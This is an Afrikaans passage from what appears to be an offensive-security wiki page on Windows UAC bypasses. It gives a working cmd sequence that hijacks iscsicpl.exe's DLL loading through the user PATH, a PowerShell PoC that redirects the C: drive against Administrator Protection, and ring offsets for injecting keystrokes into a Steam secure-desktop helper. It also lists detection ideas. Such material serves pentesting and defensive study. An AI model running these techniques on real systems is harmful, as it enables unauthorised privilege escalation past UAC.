Die 32-bis `C:\Windows\SysWOW64\iscsicpl.exe` is ’n **outomaties verhoogde** binary wat misbruik kan word om `iscsiexe.dll` volgens die soekvolgorde te laai. As jy ’n kwaadwillige `iscsiexe.dll` in ’n **skryfbare gebruikerslêergids** kan plaas en dan die huidige gebruiker se `PATH` verander (byvoorbeeld via `HKCU\Environment\Path`) sodat daar in daardie lêergids gesoek word, kan Windows die aanvaller se DLL binne die verhoogde `iscsicpl.exe`-proses laai **sonder om ’n UAC-aanporboodskap te wys**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktiese notas:
- Dit is nuttig wanneer die huidige gebruiker in **Administrators** is, maar weens UAC op **Medium Integrity** loop.
- Die **SysWOW64**-kopie is die relevante een vir hierdie bypass. Behandel die **System32**-kopie as ’n afsonderlike binary en valideer die gedrag onafhanklik.
- Die primitief kombineer **outomatiese verhoging** en **DLL search-order hijacking**, dus is dieselfde ProcMon-werkvloei wat vir ander UAC bypasses gebruik word, nuttig om die ontbrekende DLL-laai te valideer.

Minimale vloei:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Detection-idees:
- Stel ’n waarskuwing in vir `reg add` / registerskryfbewerkings na `HKCU\Environment\Path` wat onmiddellik gevolg word deur die uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
- Soek na `iscsiexe.dll` in **gebruikerbeheerde** liggings soos `%TEMP%` of `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korrelleer die lansering van `iscsicpl.exe` met onverwagte kinderprosesse of DLL-laaie van buite die normale Windows-gidse.

### Nuwer navorsing wat afsonderlik nagegaan moet word

Sommige kettings ná 2024 lyk nie meer soos die klassieke `HKCU\Software\Classes`-registerkaping nie. Byvoorbeeld, vergiftiging van die aktiveringskontekskas kan ’n **skyfherkartering** en **DLL-herleiding** kombineer om van medium na hoë integriteit te beweeg via vertroude UI-/outomaties-verhoogde binaries soos `ctfmon.exe` en latere teikens soos `fodhelper.exe`. In plaas daarvan om die groot PoC hier te dupliseer, raadpleeg die kompakte payload-voorbeelde in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (voorskou): skyfletterkaping via DOS-toestelkaart per aanmeldingsessie

> [!NOTE]
> Vanaf Augustus 2026 dokumenteer Microsoft Administrator Protection steeds as ’n **Insider-voorskou**: die ontplooiing in Oktober 2025 is teruggerol en word vir ’n latere datum beplan. Bevestig dat **Admin Approval Mode met Administrator protection** werklik geaktiveer is en dat die toestel herlaai is voordat jy hierdie kettings toets; ’n standaard 25H2-weergawestring alleen bewys nie dat die funksie aktief is nie.<sup>[[10]](#references)</sup>

Vir die volledige `RAiLaunchAdminProcess` / UIAccess-aanvalsoppervlak op Windows 11 25H2-voorskoubouweergawes, raadpleeg die toegewyde bladsy:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” gebruik shadow-admin-tokens met `\Sessions\0\DosDevices/<LUID>`-kaarte per sessie. Die gids word lui geskep deur `SeGetTokenDeviceMap` wanneer `\??` die eerste keer opgelos word. As die aanvaller die shadow-admin-token slegs op **SecurityIdentification** naboots, word die gids geskep met die aanvaller as **eienaar** (dit erf `CREATOR OWNER`), wat skyfletterskakels moontlik maak wat voorkeur geniet bo `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Stappe:**

1. Roep vanuit ’n sessie met lae voorregte `RAiProcessRunOnce` aan om ’n promptlose shadow-admin-`runonce.exe` te laat voortbring.
2. Dupliseer sy primêre token as ’n **identification**-token en boots dit na terwyl `\??` oopgemaak word, om die skepping van `\Sessions\0\DosDevices/<LUID>` onder die aanvaller se eienaarskap af te dwing.
3. Skep daar ’n `C:`-simbollink wat na aanvallerbeheerde berging wys; daaropvolgende lêerstelseltoegange in daardie sessie los `C:` na die aanvaller se pad op, wat DLL-/lêerkaping moontlik maak sonder ’n prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Op preview-gashere teken Administrator Protection goedkeurings en mislukkings as ETW-gebeurtenisse **15031** en **15032** onder die `Microsoft-Windows-LUA`-verskaffer aan. Die gebeurtenisse bevat die aanvraer se SID, toepassingpad, uitslag, bestuurde administrateurrekening en verifikasiemetode, dus lewer herhaalde exploit-pogings of mislukte UI-besturing nie geen telemetrie op nie.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Invoer op die veilige werkskerm wat deur ’n skryfbare gedeeldegeheue-ring aangestuur word

’n Hulp proses op die veilige werkskerm kan die UAC-aanporboodskap ondermyn as ’n gebruiker met medium integriteit na sy invoer-IPC kan skryf. In die gerapporteerde Steam-ontwerp begin `IClientSecureDesktop::BStartStreaming` `secure_desktop_capture.exe` as SYSTEM op `winsta0\winlogon`. Dit stel `Global\SecureDesktopInput_mem-IPCWrapper` met gebruikerstoegang `GENERIC_ALL` beskikbaar; die hulpproses verwerk ringinskrywings en roep `SendInput` op die veilige werkskerm aan. Dit verskil van UIAccess of die verandering van `PromptOnSecureDesktop`: invoer word aangestuur deur ’n proses wat reeds daar loop. Sien die [diens-IPC-bootstrap](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) vir hoe die kliënt hierdie hanteerder bereik. <sup>[[15]](#references)[[16]](#references)</sup>

Die ring het 128 gleuwe van 173 grepe. Sy skryf- en leestellers is by `0x414` en `0x418`, met gleuf `N` by `0x41c + 173*N`. Stel die gleuf se eerste greep op `0` vir gewone teks, kopieer ’n 40-greep Windows `INPUT` onmiddellik daarna, en verhoog dan die skryfteller. Vir ’n administrateur met medium integriteit wat ’n toestemmingsaanporboodskap sien, kan ’n sleutelbord-`Y`-druk-en-loslaat die bevestigende UAC-beheer aktiveer nadat ’n uitvoerbare lêer wat verhoging versoek, begin is; dit kan nie ’n aanmeldbewysaanporboodskap vir ’n standaardgebruiker beantwoord nie. Die **toestemmingshek bly belangrik**: die hulpproses stuur invoer slegs aan nadat die gebruiker sy `InputEnabled`-aanporboodskap vir die huidige magtigingstydperk van 90 dae goedgekeur het. ’n Leesbare/skryfbare afbeelding alleen bewys nie dat invoer die aanporboodskap bereik nie; vergelyk die leesteller voor en ná ’n beheerde toets. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Hoe User Account Control werk](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Versameling UAC-omseilingstegnieke](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Verenigbaarheidsskandeerder en lanseerder vir UAC-omseiling](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI gebruik AI om PowerShell-agterdeure te genereer](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operasie TrueChaos: 0-dag-uitbuiting teen Suidoos-Asiatiese regeringsteikens](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omseiling van Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Omseiling van UAC met die SilentCleanup-taak](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Omseilings van UnifiedConsent, TabTip en Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrateurbeskerming](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Roep plaaslike Windows RPC-bedieners vanuit .NET aan](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte verbeter CoolClient met ’n ondertekende Windows-kerneldrywer-rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: ’n Volledig onopspoorbare Windows-trojaan wat ontwerp is om te spioeneer, te steel en te terroriseer](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Draai aan die klep](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – Draai aan die klep-PoC’s](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
